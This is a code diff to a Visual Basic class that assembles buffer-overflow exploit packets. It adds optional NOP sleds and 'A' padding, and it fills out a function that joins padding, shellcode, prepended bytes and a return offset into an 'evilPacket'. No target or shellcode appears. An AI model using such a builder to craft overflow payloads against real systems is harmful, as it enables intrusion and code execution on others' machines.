@@ -17,6 +17,9 @@ Public evilPacket As String     ' our final packet is stored here
 Public bufferLen As Integer     ' the length we have to work with
 Public prepend As Boolean       ' do we have any data to prepend?
 Public prependBytes As String   ' What data are we prepending?
+Public useNops As Boolean       ' do we want to use nops to slide into shellcode?
+Public nopCount As Integer      ' how many nops before shellcode?
+
 'Anything below here is just for flavor.
 Public expName As String
 Public CVEID As String
@@ -31,16 +34,50 @@ Private Sub Class_Initialize()
     
 End Sub
 
-Public Function craftSploitCode()
 
-    'MsgBox makeNops(10)
+Private Function makePadding(count As Integer) As String
+    'creates some padding for us
+    Dim myPad As String
+
+    
+    For I = 1 To count
+        myPad = myPad & "A"
+    Next I
+    
+    makePadding = myPad
+    
+End Function
+
+Public Function craftSploitCode() As Integer 'returns error code
+    Dim myPacket As String
+    Dim junk As String
+    
+    If useNops = True Then
+        junk = makePadding(bufferLen - Len(shellcode) - nopCount) 'giving 25 for nop space
+        myPacket = junk & makeNops(nopCount) & shellcode
+    Else
+        junk = makePadding(bufferLen - Len(shellcode))
+        myPacket = junk & shellcode
+    End If
+    
+    
+    If prepend = True Then
+        myPacket = myPacket & prependBytes
+    End If
+    
+    
+    myPacket = myPacket & retOffset
+     
+    'MsgBox StringToHex(myPacket)
+    
+    evilPacket = myPacket
     
 End Function
 
 Private Function willShellcodeFit() As Boolean
 
     'returns true if we have enough space for our shellcode
-    If countPadding + Len(shellcode) <= bufferLen Then
+    If Len(shellcode) <= bufferLen Then
         willShellcodeFit = True
     Else
         willShellcodeFit = False
@@ -50,8 +87,9 @@ End Function
 
 Private Function countPadding() As Integer
 
-    'returns the total number of nops we're going to need.
+    'returns the total number of nops and padding characters we're going to need.
     countPadding = bufferLen - Len(shellcode) - Len(prependBytes)
+    
 End Function
 
 Private Function makeNops(count As Integer) As String
